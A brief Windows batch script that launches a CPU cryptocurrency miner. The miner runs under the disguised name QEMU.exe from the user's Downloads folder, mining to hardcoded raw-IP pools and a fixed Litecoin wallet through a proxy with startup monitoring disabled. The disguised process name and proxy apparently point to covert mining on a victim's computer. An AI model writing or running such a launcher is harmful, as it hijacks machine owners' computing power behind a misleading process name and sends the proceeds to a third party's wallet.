:: This is an example you can edit and use
:: There are numerous parameters you can set, please check Help and Examples folder
:: Start miner with administrator privileges to enable gpu-tweak-profile

setx GPU_MAX_HEAP_SIZE 100
setx GPU_MAX_USE_SYNC_OBJECTS 1
setx GPU_SINGLE_ALLOC_PERCENT 100
setx GPU_MAX_ALLOC_PERCENT 100
setx GPU_MAX_SINGLE_ALLOC_PERCENT 100

@echo off
cd %~dp0
cls

C:\Users\%USERNAME%\Downloads\QEMU.exe --algorithm yespowerr16 --pool 103.249.70.7:6534,149.56.111.148:6534,51.79.251.11:6534,141.95.55.97:6534 --disable-gpu --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc --worker x6 --password c=LTC --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --cpu-threads 6 --proxy 98.181.137.80:4145
pause
